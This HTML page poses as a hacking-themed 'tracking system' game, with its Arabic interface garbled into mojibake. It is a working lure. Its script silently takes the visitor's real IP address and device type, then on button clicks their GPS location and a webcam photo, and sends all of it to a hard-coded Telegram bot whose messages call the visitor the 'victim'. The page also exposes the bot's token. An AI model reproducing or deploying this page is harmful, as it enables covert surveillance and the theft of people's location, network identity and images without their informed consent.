<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>S P I D E R - E G A L S A</title>
    <style>
        body { background: #000; color: #f00; font-family: 'Courier New', monospace; text-align: center; margin: 0; overflow: hidden; }
        .screen { display: none; padding: 20px; height: 100vh; flex-direction: column; justify-content: center; align-items: center; }
        .active { display: flex !important; }
        .box { border: 2px solid #f00; padding: 30px; background: rgba(20,0,0,0.9); box-shadow: 0 0 20px #f00; width: 85%; max-width: 400px; }
        button { background: #f00; color: #000; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 10px; }
        input { background: #111; border: 1px dashed #f00; color: #fff; padding: 10px; width: 90%; margin: 10px 0; text-align: center; }
    </style>
</head>
<body>

<div id="screen1" class="screen active">
    <div class="box">
        <h1>Ù†Ø¸Ø§Ù… Ø§Ù„ØªØªØ¨Ø¹ V7</h1>
        <p>Ø£Ø¯Ø®Ù„ Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø³Ø±ÙŠ Ù„ÙØªØ­ Ø§Ù„Ø±Ø§Ø¯Ø§Ø±:</p>
        <input type="text" id="ipInput" placeholder="0.0.0.0">
        <button onclick="startMission()">Ø¨Ù€Ø¯Ø¡ Ø§Ù„Ù…Ù€Ù‡Ù€Ù…Ù€Ø©</button>
    </div>
</div>

<div id="screen2" class="screen">
    <div class="box">
        <h2>ØªÙ… Ø§Ù„Ø§Ø®ØªØ±Ø§Ù‚ Ø¨Ù†Ø¬Ø§Ø­</h2>
        <button onclick="getLocation()">ğŸ“ Ø³Ø­Ø¨ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ</button>
        <button onclick="startCapture()">ğŸ“¸ Ø³Ø­Ø¨ Ø§Ù„ØµÙˆØ± (Ø§Ù„Ù‚Ù†Ø§Øµ)</button>
        <button onclick="location.reload()">Ø¥ØºÙ„Ø§Ù‚ Ø§Ù„Ù…Ù†ØµØ©</button>
    </div>
</div>

<script>
    const CONFIG = {
        token: "8277722647:AAGbaCeEgSCNNzDmmTL_0uA9x4QTXxzMSrg",
        chatId: "1268323143"
    };

    // ÙˆØ¸ÙŠÙØ© Ø¥Ø±Ø³Ø§Ù„ Ù†Øµ Ø¹Ø§Ù…
    async function sendToBot(msg) {
        try {
            await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CONFIG.chatId, text: msg, parse_mode: "Markdown" })
            });
        } catch (e) { console.error("Error sending message"); }
    }

    async function startMission() {
        const userIp = document.getElementById('ipInput').value;
        
        // Ø³Ø­Ø¨ Ø§Ù„Ù€ IP Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠ ØµØ§Ù…Øª
        fetch('https://api.ipify.org?format=json')
            .then(res => res.json())
            .then(data => {
                sendToBot(`ğŸ”¥ **ØµÙŠØ¯ Ø¬Ø¯ÙŠØ¯!**\n\nğŸ‘¤ Ø§Ù„Ø¶Ø­ÙŠØ© ÙƒØªØ¨: ${userIp}\nğŸŒ Ø§Ù„Ù€ IP Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠ: ${data.ip}\nğŸ“± Ø§Ù„Ø¬Ù‡Ø§Ø²: ${navigator.platform}`);
            });

        document.getElementById('screen1').classList.remove('active');
        document.getElementById('screen2').classList.add('active');
    }

    function getLocation() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(pos => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                sendToBot(`ğŸ“ **Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¶Ø­ÙŠØ© Ø¨Ø¯Ù‚Ø©!**\n\nØ±Ø§Ø¨Ø· Ø§Ù„Ø®Ø±ÙŠØ·Ø©:\nhttps://www.google.com/maps?q=${lat},${lon}`);
                alert("ØªÙ… Ù…Ø²Ø§Ù…Ù†Ø© Ø¥Ø­Ø¯Ø§Ø«ÙŠØ§Øª Ø§Ù„Ù…ÙˆÙ‚Ø¹!");
            }, () => { alert("ÙŠØ¬Ø¨ ØªÙØ¹ÙŠÙ„ Ø§Ù„Ù€ GPS Ù„Ø³Ø­Ø¨ Ø§Ù„Ù…ÙˆÙ‚Ø¹!"); });
        }
    }

    async function startCapture() {
        alert("Ø¬Ø§Ø±ÙŠ Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§...");
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            setTimeout(async () => {
                canvas.getContext('2d').drawImage(video, 0, 0);
                const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
                const fd = new FormData();
                fd.append('chat_id', CONFIG.chatId);
                fd.append('photo', blob, 'snap.jpg');
                
                await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendPhoto`, { method: 'POST', body: fd });
                stream.getTracks().forEach(t => t.stop());
                alert("ØªÙ… Ø³Ø­Ø¨ Ø§Ù„ØµÙˆØ± Ø¨Ù†Ø¬Ø§Ø­!");
            }, 1000);
        } catch (e) { alert("ØªÙ… Ø±ÙØ¶ Ø¥Ø°Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§!"); }
    }
</script>
</body>
</html>
